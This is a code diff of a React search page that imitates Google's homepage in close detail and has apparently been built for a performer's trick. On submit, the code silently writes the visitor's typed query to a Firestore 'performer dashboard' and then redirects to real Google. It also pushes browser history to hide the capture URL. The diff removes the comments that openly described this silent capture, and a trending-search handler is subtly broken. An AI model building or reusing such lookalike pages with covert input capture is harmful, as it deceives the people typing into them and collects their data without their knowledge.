@@ -4,28 +4,11 @@ import { useParams } from 'react-router-dom';
 import { firestoreService } from '../services/firestoreService';
 import { GOOGLE_SEARCH_URL } from '../constants';
 
-const NEWS_ARTICLES = [
-  {
-    id: 1,
-    title: "SpaceX successfully launches latest Starlink mission from Florida",
-    source: "Space.com",
-    time: "2h ago",
-    image: "https://images.unsplash.com/photo-1517976487492-5750f3195933?auto=format&fit=crop&w=200&h=120&q=80"
-  },
-  {
-    id: 2,
-    title: "New study reveals surprising benefits of morning sunlight exposure",
-    source: "HealthLine",
-    time: "4h ago",
-    image: "https://images.unsplash.com/photo-1470252649378-9c29740c9fa8?auto=format&fit=crop&w=200&h=120&q=80"
-  },
-  {
-    id: 3,
-    title: "Global tech summit announces focus on sustainable AI development",
-    source: "TechCrunch",
-    time: "5h ago",
-    image: "https://images.unsplash.com/photo-1485827404703-89b55fcc595e?auto=format&fit=crop&w=200&h=120&q=80"
-  }
+const TRENDING_SEARCHES = [
+  'makar sankranti wishes',
+  'bts world tour dates',
+  'flipkart iphone 17',
+  'tata punch facelift'
 ];
 
 const SearchPage: React.FC = () => {
@@ -39,9 +22,8 @@ const SearchPage: React.FC = () => {
 
   useEffect(() => {
     inputRef.current?.focus();
-    // Browser history manipulation to hide the /search/id from immediate glance
     if (window.history.pushState) {
-        window.history.pushState(null, "", window.location.href);
+      window.history.pushState(null, "", window.location.href);
     }
   }, []);
 
@@ -50,25 +32,18 @@ const SearchPage: React.FC = () => {
     const trimmedQuery = query.trim();
     if (!trimmedQuery) return;
 
-    // Silent capture to performer dashboard
     if (performerId) {
       try {
         await firestoreService.submitSearch(performerId, trimmedQuery);
       } catch (error) {
         console.error('Error submitting search:', error);
-        // Continue with redirect even if Firestore write fails
       }
     }
 
-    // Set redirect state to prevent interaction and provide feedback
     setIsRedirecting(true);
-
-    // Immediate redirect to real Google search with parameters
-    // We use window.top.location.href to break out of iframes if necessary
     try {
       window.top!.location.href = `${GOOGLE_SEARCH_URL}${encodeURIComponent(trimmedQuery)}`;
     } catch (err) {
-      // Fallback if top-level navigation is restricted
       window.location.href = `${GOOGLE_SEARCH_URL}${encodeURIComponent(trimmedQuery)}`;
     }
   };
@@ -80,13 +55,7 @@ const SearchPage: React.FC = () => {
   const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0];
     if (file) {
-      // Redirect to Google Lens with image search
-      const reader = new FileReader();
-      reader.onload = () => {
-        // For now, redirect to Google Lens search
-        window.location.href = 'https://lens.google.com/';
-      };
-      reader.readAsDataURL(file);
+      window.location.href = 'https://lens.google.com/';
     }
   };
 
@@ -101,59 +70,58 @@ const SearchPage: React.FC = () => {
       </div>
     );
   }
-  
 
   return (
-    <div className="min-h-screen bg-white flex flex-col items-center select-none overflow-x-hidden" style={{ fontFamily: 'Roboto, arial, sans-serif' }}>
-      {/* Google Top Header */}
-      <div className="w-full h-[60px] flex justify-end items-center gap-4 text-[13px] text-[#202124] pr-6">
-        <a href="#" className="hover:underline cursor-pointer" style={{ textDecoration: 'none', color: '#202124' }}>Gmail</a>
-        <a href="#" className="hover:underline cursor-pointer" style={{ textDecoration: 'none', color: '#202124' }}>Images</a>
-        <div className="p-2 hover:bg-gray-100 rounded-full cursor-pointer transition-colors">
-          <svg className="w-[18px] h-[18px] text-[#5f6368]" fill="currentColor" viewBox="0 0 24 24">
-            <path d="M6,8c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S4.9,8,6,8z M12,20c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S10.9,20,12,20z M6,20 c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S4.9,20,6,20z M6,14c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S4.9,14,6,14z M12,14c1.1,0,2-0.9,2-2 s-0.9-2-2-2s-2,0.9-2,2S10.9,14,12,14z M18,14c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S16.9,14,18,14z M18,8c1.1,0,2-0.9,2-2 s-0.9-2-2-2s-2,0.9-2,2S16.9,8,18,8z M12,8c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S10.9,8,12,8z M18,20c1.1,0,2-0.9,2-2s-0.9-2-2-2 s-2,0.9-2,2S16.9,20,18,20z"></path>
-          </svg>
+    <div className="min-h-screen bg-white flex flex-col font-sans overflow-x-hidden">
+      {/* Google Header */}
+      <header className="w-full flex items-center justify-between px-4 sm:px-6 h-[60px]">
+        <div className="flex items-center gap-6 text-[13px] text-[#202124]">
+          <a href="#" className="hover:underline">About</a>
+          <a href="#" className="hover:underline">Store</a>
         </div>
-        <button className="bg-[#1a73e8] text-white px-6 py-[9px] rounded-[4px] font-medium hover:shadow-md transition-shadow text-sm leading-none" style={{ fontFamily: 'Roboto, arial, sans-serif' }}>
-          Sign in
-        </button>
-      </div>
+        <div className="flex items-center gap-4 sm:gap-6 text-[13px] text-[#202124]">
+          <a href="#" className="hover:underline">Gmail</a>
+          <a href="#" className="hover:underline">Images</a>
+          <button className="p-2 hover:bg-gray-100 rounded-full transition-colors">
+            <svg className="w-5 h-5 text-[#5f6368]" fill="currentColor" viewBox="0 0 24 24">
+              <path d="M6,8c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S4.9,8,6,8z M12,20c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S10.9,20,12,20z M6,20 c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S4.9,20,6,20z M6,14c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S4.9,14,6,14z M12,14c1.1,0,2-0.9,2-2 s-0.9-2-2-2s-2,0.9-2,2S10.9,14,12,14z M18,14c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S16.9,14,18,14z M18,8c1.1,0,2-0.9,2-2 s-0.9-2-2-2s-2,0.9-2,2S16.9,8,18,8z M12,8c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S10.9,8,12,8z M18,20c1.1,0,2-0.9,2-2s-0.9-2-2-2 s-2,0.9-2,2S16.9,20,18,20z"></path>
+            </svg>
+          </button>
+          <button className="bg-[#1a73e8] text-white px-6 py-2 rounded-[4px] font-medium hover:shadow-md transition-shadow text-sm">
+            Sign in
+          </button>
+        </div>
+      </header>
 
-      {/* Center Search Area */}
-      <div className="flex-1 flex flex-col items-center pt-6 md:pt-[200px] w-full max-w-xl px-4">
+      {/* Main Content */}
+      <main className="flex-1 flex flex-col items-center pt-6 sm:pt-[120px] pb-8 px-4">
         {/* Google Logo */}
-        <div className="mb-8 select-none pointer-events-none">
-          <div className="text-[80px] md:text-[92px] font-normal tracking-[-0.02em] google-font flex leading-none" style={{ fontFamily: "'Product Sans', 'Roboto', arial, sans-serif", fontWeight: 400 }}>
-             <span className="text-[#4285F4]">G</span>
-             <span className="text-[#EA4335]">o</span>
-             <span className="text-[#FBBC05]">o</span>
-             <span className="text-[#4285F4]">g</span>
-             <span className="text-[#34A853]">l</span>
-             <span className="text-[#EA4335]">e</span>
+        <div className="mb-8 sm:mb-10">
+          <div className="text-[80px] sm:text-[92px] font-normal tracking-[-0.02em] google-font leading-none">
+            <span className="text-[#4285F4]">G</span>
+            <span className="text-[#EA4335]">o</span>
+            <span className="text-[#FBBC05]">o</span>
+            <span className="text-[#4285F4]">g</span>
+            <span className="text-[#34A853]">l</span>
+            <span className="text-[#EA4335]">e</span>
           </div>
         </div>
 
-        {/* Search Bar Container */}
-        <form onSubmit={handleSearch} className="w-full max-w-[584px] relative mb-8 sm:mb-11">
+        {/* Search Bar */}
+        <form onSubmit={handleSearch} className="w-full max-w-[584px] mb-8">
           <div 
-            className={`flex items-center w-full h-[44px] px-4 sm:px-5 rounded-full border transition-all bg-white
-            ${isFocused ? 'shadow-[0_2px_5px_1px_rgba(64,60,67,0.16)] border-transparent' : 'border-[#dfe1e5] hover:shadow-[0_2px_5px_1px_rgba(64,60,67,0.16)] hover:border-transparent'}`}
-            style={{ boxShadow: isFocused ? '0 2px 5px 1px rgba(64,60,67,.16)' : undefined }}
+            className={`flex items-center w-full h-[44px] sm:h-[46px] px-4 sm:px-5 rounded-full border transition-all bg-white
+            ${isFocused 
+              ? 'shadow-[0_2px_5px_1px_rgba(64,60,67,0.16)] border-transparent' 
+              : 'border-[#dfe1e5] hover:shadow-[0_2px_5px_1px_rgba(64,60,67,0.16)] hover:border-transparent'
+            }`}
           >
-            <button
-              type="button"
-              className="pr-2 flex items-center justify-center flex-shrink-0"
-              title="Search tools"
-            >
-              <svg className="w-5 h-5 text-[#5f6368]" fill="currentColor" viewBox="0 0 24 24">
-                <path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/>
-              </svg>
-            </button>
-            <div className="pr-3 sm:pr-4 flex items-center justify-center flex-shrink-0">
-              <svg className="w-5 h-5 text-[#9aa0a6]" fill="currentColor" viewBox="0 0 24 24">
-                <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
-              </svg>
-            </div>
+            {/* Search Icon */}
+            <svg className="w-5 h-5 text-[#9aa0a6] mr-3 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
+              <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+            </svg>
+
+            {/* Input */}
             <input 
               ref={inputRef}
               type="text" 
@@ -162,35 +130,50 @@ const SearchPage: React.FC = () => {
               onFocus={() => setIsFocused(true)}
               onBlur={() => setIsFocused(false)}
               className="flex-1 min-w-0 focus:outline-none text-[16px] text-[#202124] h-full bg-transparent"
-              style={{ fontFamily: 'Roboto, arial, sans-serif' }}
               autoComplete="off"
               autoCorrect="off"
               spellCheck="false"
             />
-            <div className="flex items-center pl-3 gap-2 flex-shrink-0">
+
+            {/* Right Icons */}
+            <div className="flex items-center gap-1 sm:gap-2 ml-2 flex-shrink-0">
+              {/* Plus Icon */}
               <button
                 type="button"
-                className="p-1.5 hover:bg-gray-100 active:bg-gray-200 rounded-full transition-colors touch-manipulation"
+                className="p-1.5 hover:bg-gray-100 rounded-full transition-colors"
+                title="Add"
+              >
+                <svg className="w-5 h-5 text-[#5f6368]" fill="currentColor" viewBox="0 0 24 24">
+                  <path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/>
+                </svg>
+              </button>
+
+              {/* Microphone */}
+              <button
+                type="button"
+                className="p-1.5 hover:bg-gray-100 rounded-full transition-colors"
                 title="Voice Search"
               >
                 <img 
                   src="https://www.gstatic.com/images/branding/googlemic/2x/googlemic_color_24dp.png" 
                   className="w-6 h-6" 
-                  alt="Voice Search"
+                  alt="Voice Search" 
                   onError={(e) => {
-                    const target = e.target as HTMLImageElement;
-                    target.style.display = 'none';
+                    (e.target as HTMLImageElement).style.display = 'none';
                   }}
                 />
               </button>
+
+              {/* Camera / Lens */}
               <button
                 type="button"
                 onClick={handleCameraClick}
-                className="p-1.5 hover:bg-gray-100 active:bg-gray-200 rounded-full transition-colors touch-manipulation"
+                className="p-1.5 hover:bg-gray-100 rounded-full transition-colors"
                 title="Search by image"
               >
-                <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24" style={{ color: '#5f6368' }}>
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                <svg className="w-6 h-6 text-[#5f6368]" fill="currentColor" viewBox="0 0 24 24">
+                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.31-8.86c-1.77-.45-2.34-.94-2.34-1.67 0-.84.79-1.43 2.1-1.43 1.38 0 1.9.66 1.94 1.64h1.71c-.05-1.34-.87-2.57-2.49-2.97V5H10.9v1.69c-1.51.32-2.72 1.3-2.72 2.81 0 1.79 1.49 2.69 3.66 3.21 1.95.46 2.34 1.15 2.34 1.87 0 .53-.39 1.39-2.1 1.39-1.6 0-2.23-.72-2.32-1.64H8.04c.1 1.7 1.36 2.66 2.86 2.97V19h2.34v-1.67c1.52-.29 2.72-1.16 2.73-2.77-.01-2.2-1.9-2.96-3.66-3.42z"/>
+                  <circle cx="17" cy="7" r="1.5" fill="currentColor"/>
                 </svg>
               </button>
               <input
@@ -201,104 +184,112 @@ const SearchPage: React.FC = () => {
                 className="hidden"
                 capture="environment"
               />
+
+              {/* AI Mode */}
               <button
                 type="button"
                 onClick={toggleAIMode}
-                className={`px-3 py-1.5 rounded-full text-xs font-medium transition-all flex items-center gap-1.5 touch-manipulation ${
+                className={`px-3 py-1.5 rounded-full text-xs font-medium transition-all flex items-center gap-1.5 ${
                   isAIMode 
-                    ? 'bg-[#1a73e8] text-white border border-[#1a73e8]' 
-                    : 'bg-[#f1f3f4] text-[#3c4043] border border-[#f1f3f4] hover:bg-[#e8eaed]'
+                    ? 'bg-[#1a73e8] text-white' 
+                    : 'bg-[#f1f3f4] text-[#3c4043] hover:bg-[#e8eaed]'
                 }`}
-                style={{ fontFamily: 'Roboto, arial, sans-serif' }}
                 title="AI Mode"
               >
-                <svg className="w-3.5 h-3.5 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
+                <svg className="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 24 24">
                   <path d="M12 2l1.09 3.26L16 6l-2.91 1.09L12 10.18l-1.09-2.09L8 6l2.91-0.74L12 2zm0 16l-1.09-1.09L9 16l1.09 1.09L12 18.18l1.91-1.09L15 16l-1.09-1.09L12 18zm6-8l-1.09-1.09L16 8l1.09 1.09L18 10.18l1.91-1.09L21 8l-1.09-1.09L18 10zm-12 0l-1.09-1.09L4 8l1.09 1.09L6 10.18l1.91-1.09L9 8l-1.09-1.09L6 10z"/>
                 </svg>
-                <span className="whitespace-nowrap">AI Mode</span>
+                <span>AI Mode</span>
               </button>
             </div>
           </div>
 
-          {/* Buttons Area */}
-          <div className="mt-7 flex flex-row justify-center gap-3">
+          {/* Search Buttons */}
+          <div className="mt-7 flex justify-center gap-3">
             <button 
               type="submit"
-              className="px-4 py-2 bg-[#f8f9fa] hover:bg-[#f1f3f4] border border-[#f8f9fa] hover:border-[#dadce0] hover:shadow-[0_1px_1px_rgba(0,0,0,0.1)] rounded-[4px] text-sm text-[#3c4043] transition-all min-w-[120px] sm:min-w-[126px] touch-manipulation"
-              style={{ fontFamily: 'Roboto, arial, sans-serif', fontSize: '14px' }}
+              className="px-4 py-2 bg-[#f8f9fa] hover:bg-[#f1f3f4] border border-[#f8f9fa] hover:border-[#dadce0] hover:shadow-[0_1px_1px_rgba(0,0,0,0.1)] rounded-[4px] text-sm text-[#3c4043] transition-all min-w-[120px] sm:min-w-[126px]"
             >
               Google Search
             </button>
             <button 
               type="button"
-              className="px-4 py-2 bg-[#f8f9fa] hover:bg-[#f1f3f4] border border-[#f8f9fa] hover:border-[#dadce0] hover:shadow-[0_1px_1px_rgba(0,0,0,0.1)] rounded-[4px] text-sm text-[#3c4043] transition-all min-w-[120px] sm:min-w-[126px] touch-manipulation"
-              style={{ fontFamily: 'Roboto, arial, sans-serif', fontSize: '14px' }}
+              className="px-4 py-2 bg-[#f8f9fa] hover:bg-[#f1f3f4] border border-[#f8f9fa] hover:border-[#dadce0] hover:shadow-[0_1px_1px_rgba(0,0,0,0.1)] rounded-[4px] text-sm text-[#3c4043] transition-all min-w-[120px] sm:min-w-[126px]"
             >
               I'm Feeling Lucky
             </button>
           </div>
         </form>
 
-        {/* Discover / News Recommendations Feed */}
-        <div className="w-full max-w-[584px] border-t border-gray-100 pt-8">
-          <div className="flex items-center justify-between mb-4">
-             <div className="flex items-center gap-2">
-                <svg className="w-5 h-5 text-[#4285F4]" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14.5v-9l6 4.5-6 4.5z"/></svg>
-                <span className="text-sm font-medium text-gray-900">Discover</span>
-             </div>
-             <svg className="w-5 h-5 text-gray-400 cursor-pointer" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 5v.01M12 12v.01M12 19v.01M12 6a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2z"></path></svg>
-          </div>
+        {/* Promotional Link - Desktop */}
+        <div className="hidden sm:block mb-6">
+          <a href="#" className="text-[#1a73e8] hover:underline text-sm">
+            Enjoy Republic Day deals on the latest Google Pixel devices & more
+          </a>
+        </div>
 
-          <div className="space-y-4 mb-12">
-            {NEWS_ARTICLES.map((article) => (
-              <div key={article.id} className="group cursor-pointer flex gap-4 p-4 hover:bg-gray-50 rounded-2xl transition-colors border border-gray-100">
-                <div className="flex-1">
-                  <div className="flex items-center gap-2 mb-1">
-                    <span className="text-xs font-medium text-gray-500">{article.source}</span>
-                    <span className="text-gray-300">•</span>
-                    <span className="text-xs text-gray-400">{article.time}</span>
-                  </div>
-                  <h3 className="text-base font-medium text-gray-900 leading-tight group-hover:text-blue-600 transition-colors">
-                    {article.title}
-                  </h3>
-                </div>
-                <div className="w-[100px] h-[70px] rounded-xl overflow-hidden flex-shrink-0">
-                  <img src={article.image} alt="" className="w-full h-full object-cover" />
-                </div>
-              </div>
+        {/* Language Options */}
+        <div className="text-center mb-8 sm:mb-12">
+          <p className="text-[13px] text-[#4d5156] mb-2">Google offered in:</p>
+          <div className="flex flex-wrap justify-center gap-x-2 gap-y-1 text-[13px]">
+            <a href="#" className="text-[#1a0dab] hover:underline">हिन्दी</a>
+            <a href="#" className="text-[#1a0dab] hover:underline">বাংলা</a>
+            <a href="#" className="text-[#1a0dab] hover:underline">తెలుగు</a>
+            <a href="#" className="text-[#1a0dab] hover:underline">मराठी</a>
+            <a href="#" className="text-[#1a0dab] hover:underline">தமிழ்</a>
+            <a href="#" className="text-[#1a0dab] hover:underline">ગુજરાતી</a>
+            <a href="#" className="text-[#1a0dab] hover:underline">ಕನ್ನಡ</a>
+            <a href="#" className="text-[#1a0dab] hover:underline">മലയാളം</a>
+            <a href="#" className="text-[#1a0dab] hover:underline">ਪੰਜਾਬੀ</a>
+          </div>
+        </div>
+
+        {/* Trending Searches - Mobile */}
+        <div className="w-full max-w-[584px] sm:hidden">
+          <div className="flex items-center justify-between mb-4 px-2">
+            <h2 className="text-base font-medium text-[#202124]">Trending searches</h2>
+            <button className="p-1">
+              <svg className="w-5 h-5 text-[#5f6368]" fill="currentColor" viewBox="0 0 24 24">
+                <path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/>
+              </svg>
+            </button>
+          </div>
+          <div className="space-y-0">
+            {TRENDING_SEARCHES.map((search, index) => (
+              <button
+                key={index}
+                onClick={() => {
+                  setQuery(search);
+                  handleSearch();
+                }}
+                className="w-full flex items-center gap-3 px-2 py-3 hover:bg-gray-50 border-b border-gray-100 text-left"
+              >
+                <svg className="w-4 h-4 text-[#5f6368] flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
+                  <path d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6z"/>
+                </svg>
+                <span className="text-sm text-[#202124]">{search}</span>
+              </button>
             ))}
           </div>
         </div>
+      </main>
 
-        <div className="mt-8 mb-8 text-[13px] text-[#4d5156] text-center" style={{ fontFamily: 'Roboto, arial, sans-serif' }}>
-          Google offered in: 
-          <a href="#" className="text-[#1a0dab] hover:underline cursor-pointer ml-2" style={{ textDecoration: 'none' }}>हिन्दी</a> 
-          <a href="#" className="text-[#1a0dab] hover:underline cursor-pointer ml-2" style={{ textDecoration: 'none' }}>বাংলা</a> 
-          <a href="#" className="text-[#1a0dab] hover:underline cursor-pointer ml-2" style={{ textDecoration: 'none' }}>తెలుగు</a>
-          <a href="#" className="text-[#1a0dab] hover:underline cursor-pointer ml-2" style={{ textDecoration: 'none' }}>मराठी</a>
-          <a href="#" className="text-[#1a0dab] hover:underline cursor-pointer ml-2" style={{ textDecoration: 'none' }}>ગુજરાતી</a>
-          <a href="#" className="text-[#1a0dab] hover:underline cursor-pointer ml-2" style={{ textDecoration: 'none' }}>ಕನ್ನಡ</a>
-          <a href="#" className="text-[#1a0dab] hover:underline cursor-pointer ml-2" style={{ textDecoration: 'none' }}>മലയാളം</a>
-          <a href="#" className="text-[#1a0dab] hover:underline cursor-pointer ml-2" style={{ textDecoration: 'none' }}>ਪੰਜਾਬੀ</a>
-        </div>
-      </div>
-
-      {/* Footer Area */}
-      <footer className="w-full bg-[#f2f2f2] text-[14px] text-[#70757a] mt-auto" style={{ fontFamily: 'Roboto, arial, sans-serif' }}>
-        <div className="px-7 py-[15px] border-b border-[#dadce0]">
+      {/* Footer */}
+      <footer className="w-full bg-[#f2f2f2] text-[14px] text-[#70757a] mt-auto">
+        <div className="px-4 sm:px-7 py-[15px] border-b border-[#dadce0]">
           <span>India</span>
         </div>
-        <div className="px-7 py-[15px] flex flex-wrap justify-center sm:justify-between gap-x-7 gap-y-3 max-w-[1600px] mx-auto">
-          <div className="flex gap-x-7">
-            <a href="#" className="hover:underline cursor-pointer" style={{ textDecoration: 'none', color: '#70757a' }}>About</a>
-            <a href="#" className="hover:underline cursor-pointer" style={{ textDecoration: 'none', color: '#70757a' }}>Advertising</a>
-            <a href="#" className="hover:underline cursor-pointer" style={{ textDecoration: 'none', color: '#70757a' }}>Business</a>
-            <a href="#" className="hover:underline cursor-pointer" style={{ textDecoration: 'none', color: '#70757a' }}>How Search works</a>
+        <div className="px-4 sm:px-7 py-[15px] flex flex-wrap justify-center sm:justify-between gap-x-7 gap-y-3 max-w-[1600px] mx-auto">
+          <div className="flex flex-wrap gap-x-7">
+            <a href="#" className="hover:underline">About</a>
+            <a href="#" className="hover:underline">Advertising</a>
+            <a href="#" className="hover:underline">Business</a>
+            <a href="#" className="hover:underline">How Search works</a>
           </div>
-          <div className="flex gap-x-7">
-            <a href="#" className="hover:underline cursor-pointer" style={{ textDecoration: 'none', color: '#70757a' }}>Privacy</a>
-            <a href="#" className="hover:underline cursor-pointer" style={{ textDecoration: 'none', color: '#70757a' }}>Terms</a>
-            <a href="#" className="hover:underline cursor-pointer" style={{ textDecoration: 'none', color: '#70757a' }}>Settings</a>
+          <div className="flex flex-wrap gap-x-7">
+            <a href="#" className="hover:underline">Privacy</a>
+            <a href="#" className="hover:underline">Terms</a>
+            <a href="#" className="hover:underline">Settings</a>
           </div>
         </div>
       </footer>
